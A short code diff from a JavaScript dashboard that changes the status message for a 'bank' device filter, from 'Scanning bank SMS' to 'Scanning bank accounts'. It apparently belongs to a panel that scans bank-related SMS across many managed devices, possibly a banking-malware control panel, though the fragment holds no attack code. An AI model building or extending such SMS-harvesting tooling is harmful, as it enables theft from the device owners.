@@ -474,8 +474,8 @@ function setDevFilter(mode,btn){
   if(mode==='bank'){
     var pending=allDevs.some(function(d){return deviceBankCache[d.id]===undefined;});
     if(pending){
-      toast('Scanning bank SMS...',true);
-      scanAllDevicesBank().then(function(){renderDevices();updateStats();});
+      document.getElementById('hdrSub').textContent='Scanning bank accounts...';
+      scanAllDevicesBank().then(function(){renderDevices();updateStats();updateFbUi();});
       return;
     }
   }
